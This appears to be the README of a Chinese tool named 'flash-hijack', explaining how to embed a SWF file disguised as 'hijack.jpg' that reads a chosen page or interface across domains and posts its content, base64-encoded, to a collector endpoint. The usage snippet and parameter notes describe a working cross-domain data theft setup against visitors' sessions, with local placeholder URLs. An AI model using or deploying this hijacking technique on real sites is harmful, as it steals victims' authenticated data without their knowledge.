# flash-hijack
flash 劫持轮子

使用：
HTML：

<div> 
<embed src="hijack.jpg?jpg=http://127.0.0.1/1.png&get=http://127.0.0.1/l.php&post=http://127.0.0.1/2.php" width="970" height="107" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent"></embed> 
</object> 
</div>

参数说明:

jpg：域下的图片（为了优先加载crossdomain.xml，否则劫持的接口加载太慢会导致无法劫持）

get：劫持的接口或者页面

post：接收劫持过来的页面为base64传输

文章:https://zhuanlan.zhihu.com/p/67484852
